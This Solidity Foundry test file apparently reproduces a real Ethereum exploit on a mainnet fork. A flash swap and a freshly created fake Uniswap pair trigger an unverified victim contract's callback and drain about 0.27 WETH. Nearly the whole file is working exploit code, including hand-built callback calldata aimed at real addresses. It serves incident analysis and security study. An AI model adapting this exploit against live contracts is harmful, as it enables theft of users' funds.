// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $1,006.89
// Attacker : 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d
// Attack Contract : 0x46bBB647B61560432b58eCBa6Bd048D691701D82
// Vulnerable Contract : 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc
// Attack Tx : https://etherscan.io/tx/0x6fb78c7737463ea39a23159dd8496c178106b4ee657f2fb6fcb628240c39cd2e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1544
//
// Attack summary: The attacker used a real DAI/WETH flash swap, created a temporary token/pair, and made that fake
// pair call the victim's UniswapV2 callback.
// Root cause: The unverified victim accepted a callback from a freshly-created fake pair and transferred WETH to it;
// manipulated fake-pair reserves let the attacker withdraw WETH and keep the surplus after repaying the real flash swap.

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d;
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
    address private constant TEMP_HELPER = 0x25bCC6F744D2b23CE39D8189E151dE4aA621Bb6c;
    uint256 private constant FORK_BLOCK = 23_002_633;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;

    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(WETH);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(VICTIM, "unverified callback target");
        vm.label(TEMP_TOKEN, "temporary token");
        vm.label(TEMP_HELPER, "temporary helper");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public balanceLog {
        FakeERC20 implementation = new FakeERC20();
        vm.etch(TEMP_TOKEN, address(implementation).code);
        NoopSwapHelper helperImplementation = new NoopSwapHelper();
        vm.etch(TEMP_HELPER, address(helperImplementation).code);

        FakeCallbackExploit exploit = new FakeCallbackExploit(ATTACKER);
        FakeERC20(TEMP_TOKEN).mint(address(exploit), 1_000_000_000 ether);

        uint256 beforeBalance = WETH.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.execute();

        assertEq(WETH.balanceOf(ATTACKER) - beforeBalance, PROFIT_WETH, "WETH profit mismatch");
    }
}

contract FakeCallbackExploit {
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
    address private constant TEMP_PAIR = 0x986a80dE5B3066350Eb921d9D99a9efCa205c2d9;
    address private constant DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private constant FLASH_WETH = 100_000_000_000_000_000;
    uint256 private constant VICTIM_WETH_PAYMENT = 269_000_000_000_000_000;
    uint256 private constant TEMP_PAIR_WETH_OUT = 367_892_963_578_592_963;
    uint256 private constant FLASH_REPAY = 100_300_902_708_124_374;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;

    IERC20Like private constant WETH = IERC20Like(WETH_ADDRESS);
    IERC20Like private constant FAKE_TOKEN = IERC20Like(TEMP_TOKEN);

    address private immutable _recipient;

    constructor(address recipient) {
        _recipient = recipient;
    }

    function execute() external {
        IUniswapV2Pair(DAI_WETH_PAIR).swap(0, FLASH_WETH, address(this), bytes("COMPLETE_RECOVERY"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == DAI_WETH_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0 && amount1 == FLASH_WETH, "unexpected flash amount");

        address pair = IUniswapV2Factory(UNISWAP_FACTORY).createPair(TEMP_TOKEN, WETH_ADDRESS);
        require(pair == TEMP_PAIR, "unexpected temp pair");

        FAKE_TOKEN.transfer(TEMP_PAIR, 100 ether);
        WETH.transfer(TEMP_PAIR, FLASH_WETH);
        IUniswapV2Pair(TEMP_PAIR).sync();

        IUniswapV2Pair(TEMP_PAIR).swap(1 ether, 0, VICTIM, VICTIM_CALLBACK_DATA);
        require(WETH.balanceOf(TEMP_PAIR) == FLASH_WETH + VICTIM_WETH_PAYMENT, "victim payment mismatch");

        IUniswapV2Pair(TEMP_PAIR).sync();
        FAKE_TOKEN.transfer(TEMP_PAIR, 999_999_900 ether);
        IUniswapV2Pair(TEMP_PAIR).swap(0, TEMP_PAIR_WETH_OUT, address(this), "");

        WETH.transfer(DAI_WETH_PAIR, FLASH_REPAY);
        WETH.transfer(_recipient, PROFIT_WETH);
    }

    bytes private constant VICTIM_CALLBACK_DATA =
        hex"0000000000000000000000000000000000000000000000000000000000000020"
        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000003bbae1324948000"
        hex"000000000000000000000000986a80de5b3066350eb921d9d99a9efca205c2d9"
        hex"0000000000000000000000006883fe4d2ee50941b80b41b8f7f9bf2561d844cc"
        hex"0000000000000000000000000000000000000000000000000000000000000100"
        hex"0000000000000000000000000000000000000000000000000000000000000001"
        hex"0000000000000000000000000000000000000000000000000000000000000020"
        hex"00000000000000000000000025bcc6f744d2b23ce39d8189e151de4aa621bb6c"
        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
        hex"0000000000000000000000000000000000000000000000a68710a042803a0da7"
        hex"000000000000000000000000000000000000000000025d922df44933065cbbe8"
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000e0"
        hex"0000000000000000000000000000000000000000000000000000000000000120"
        hex"0000000000000000000000000000000000000000000000000000000000000020"
        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
        hex"00000000000000000000000067f6965c0b899d12122d116d890a034e05881562"
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        hex"0000000000000000000000000000000000000000000000000000000000000000"
        hex"0000000000000000000000000000000000000000000000001bc16d674ec80000"
        hex"000000000000000000000000986a80de5b3066350eb921d9d99a9efca205c2d9"
        hex"0000000000000000000000006883fe4d2ee50941b80b41b8f7f9bf2561d844cc"
        hex"00000000000000000000000000000000000000000000000000000000000000e0";
}

contract FakeERC20 {
    mapping(address => uint256) public balanceOf;

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function symbol() external pure returns (string memory) {
        return "TMP";
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NoopSwapHelper {
    function swap(uint256, uint256, address, bytes calldata) external {}
}
